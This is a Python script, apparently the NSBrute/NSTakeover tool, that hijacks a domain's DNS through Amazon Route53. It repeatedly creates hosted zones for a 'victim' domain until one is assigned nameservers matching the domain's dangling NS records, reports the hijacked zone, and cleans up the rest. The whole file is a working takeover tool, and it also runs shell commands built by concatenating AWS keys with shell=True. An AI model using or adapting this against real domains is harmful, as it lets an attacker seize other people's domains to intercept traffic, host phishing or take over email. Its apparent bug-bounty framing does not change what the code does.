import route53
import sys
import time
import traceback
import dns.resolver
import subprocess
import json
import ast

accessKey=""
secretKey=""
victimDomain=""
targetNS=[]
nsRecord=0


class bcolors:
    TITLE = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    INFO = '\033[93m'
    OKRED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    UNDERLINE = '\033[4m'
    FGWHITE = '\033[37m'
    FAIL = '\033[95m'


def myPrint(text, type):
	if(type=="INFO"):
		print bcolors.INFO+text+bcolors.ENDC+"\n"
		return
	if(type=="INFO_WS"):
		print bcolors.INFO+text+bcolors.ENDC
		return
	if(type=="ERROR"):
		print bcolors.BGRED+bcolors.FGWHITE+bcolors.BOLD+text+bcolors.ENDC
		return
	if(type=="MESSAGE"):
		print bcolors.TITLE+bcolors.BOLD+text+bcolors.ENDC+"\n"
		return
	if(type=="INSECURE_WS"):
		print bcolors.OKRED+bcolors.BOLD+text+bcolors.ENDC
		return
	if(type=="OUTPUT"):
		print bcolors.OKBLUE+bcolors.BOLD+text+bcolors.ENDC+"\n"
		return
	if(type=="OUTPUT_WS"):
		print bcolors.OKBLUE+bcolors.BOLD+text+bcolors.ENDC
		return
	if(type=="SECURE"):
		print bcolors.OKGREEN+bcolors.BOLD+text+bcolors.ENDC

#python NSBrute.py -d domain -a accessKey -s secretKey -ns a,b,c,d -f

zones_to_keep = []
forceDelete = False

if (len(sys.argv)<7):
	myPrint("Please provide the required arguments to initiate scanning.", "ERROR")
	print ""
	myPrint("Usage: python NSTakeover.py -d domain -a accessKey -s secretKey","ERROR")
	myPrint("Please try again!!", "ERROR") 
	print ""
	exit(1);
if (sys.argv[1]=="-d" or sys.argv[1]=="--domain"):
	victimDomain=sys.argv[2]
if (sys.argv[3]=="-a" or sys.argv[3]=="--accessId"):
	accessKey=sys.argv[4]
if (sys.argv[5]=="-s" or sys.argv[5]=="--secretKey"):
	secretKey=sys.argv[6]
if len(sys.argv) >= 8:
	if (sys.argv[7]=="-f" or sys.argv[7]=="--forceDelete"):
		forceDelete =  True
try:
	nsRecords = dns.resolver.query(victimDomain, 'NS')
except:
	myPrint("Unable to fetch NS records for "+victimDomain+"\nPlease check the domain name and try again.","ERROR")
	exit(1)
isInt= isinstance(nsRecords,int)
if isInt and nsRecords==0:
	myPrint("No NS records found for "+victimDomain+"\nPlease check the domain name and try again.","ERROR")
	exit(1)
for nameserver in nsRecords:
		targetNS.append(str(nameserver))

#strip leading and trailing spaces	
for index in range(len(targetNS)):
		targetNS[index]=targetNS[index].strip()
#strip trailing .
		targetNS[index]=targetNS[index].strip(".")

conn = route53.connect(
    aws_access_key_id=accessKey,
    aws_secret_access_key=secretKey,
)

created_zones = []
successful_zone = []
counter=0
try:

	while True:
		counter=counter+1
		myPrint("Iteration Count: "+str(counter),"INFO_WS")
		try: 
			new_zone=0
			new_zone, change_info = conn.create_hosted_zone(
			# in honor of bagipro, we love your reports, we hope you never stop researching and participating in bug bounty
		    victimDomain, comment='zaheck'
			)
			hosted_zone_id = new_zone.__dict__["id"]
			created_zones.append(hosted_zone_id)
			#Erroneous Condition
			if new_zone is None:
				continue
			nsAWS=new_zone.nameservers
			myPrint("Created a new zone with following NS: ","INFO_WS")
			myPrint(" ".join(nsAWS),"INFO_WS")
			intersection=set(nsAWS).intersection(set(targetNS))
			if(len(intersection)==0):
				myPrint("No common NS found, deleting new zone","ERROR")
				print ""
				new_zone.delete()
			else:
				myPrint("Successful attempt after "+str(counter)+" iterations.","SECURE")
				myPrint("Check your AWS account, the work is done!","SECURE")
				print "This is the hijacked Zone ID: " + str(hosted_zone_id)
				hijacked_zone = next(iter(intersection))
				print "This is the zone you hijacked: " + str(hijacked_zone)
				successful_zone.append(hosted_zone_id)
				created_zones.remove(hosted_zone_id)
				print ""
				break
		except Exception as e:
			myPrint("Exceptional behaviour observed while creating the zone.", "ERROR")
			myPrint("Trying Again!","ERROR")
			if new_zone != 0:
				new_zone.delete()
			continue

except KeyboardInterrupt:
	quit = raw_input("Would you like to quit without having deleted all hosted zones? Put 'y' if you want to quit now without having deleted all hosted zones. Put any other sequence of characters to quit immediately: ")
	if (len(created_zones) != 0 and quit == "y") or forceDelete:
		command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 list-hosted-zones"
		out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
		stdout,stderr = out.communicate()
		json_data = None

		if stdout != 'false':
			json_data = json.loads(stdout)
		
		zones_to_be_removed = []
		zones_for_account = []
		
		for zone in json_data["HostedZones"]:
			zones_for_account.append(str(zone["Id"].replace("/hostedzone/","")))

		if len(successful_zone) != 0:
			if successful_zone[0] in created_zones:
				created_zones.remove(successful_zone[0])
		
		for zone in created_zones:
			if zone in zones_for_account:
				zones_to_be_removed.append(zone)
		
		for zone in zones_to_be_removed:
			command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 delete-hosted-zone --id " + str(zone)
			out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
			stdout,stderr = out.communicate()

	else:
		exit()

command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 list-hosted-zones"
out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
stdout,stderr = out.communicate()
json_data = None

if stdout != 'false':
	json_data = json.loads(stdout)

zones_to_be_removed = []
zones_for_account = []

for zone in json_data["HostedZones"]:
	zones_for_account.append(str(zone["Id"].replace("/hostedzone/","")))

if len(successful_zone) != 0:
	if successful_zone[0] in created_zones:
		created_zones.remove(successful_zone[0])

for zone in created_zones:
	if zone in zones_for_account:
		zones_to_be_removed.append(zone)

for zone in zones_to_be_removed:
	command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 delete-hosted-zone --id " + str(zone)
	out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
	stdout,stderr = out.communicate()
